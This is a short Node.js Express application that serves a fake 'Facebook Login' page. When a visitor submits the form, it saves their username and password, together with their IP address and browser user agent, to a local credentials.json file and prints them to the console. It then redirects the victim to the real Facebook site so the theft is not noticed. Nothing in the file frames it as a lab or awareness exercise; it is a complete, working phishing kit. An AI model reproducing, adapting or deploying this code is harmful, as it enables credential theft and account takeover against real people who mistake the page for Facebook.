const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get('/', (req, res) => {
  res.send(`
    <html>
      <body>
        <h1>Facebook Login</h1>
        <form action="/login" method="POST">
          <input type="text" name="username" placeholder="Email or Phone Number" required>
          <input type="password" name="password" placeholder="Password" required>
          <input type="submit" value="Log In">
        </form>
      </body>
    </html>
  `);
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const data = {
    username,
    password,
    ipAddress: req.connection.remoteAddress,
    userAgent: req.headers['user-agent'],
  };

  fs.writeFile('credentials.json', JSON.stringify(data, null, 2), (err) => {
    if (err) throw err;
    console.log('Credentials saved:', data);
    res.redirect('https://www.facebook.com/');
  });
});

app.listen(8080, () => {
  console.log('Listening on port 8080...');
});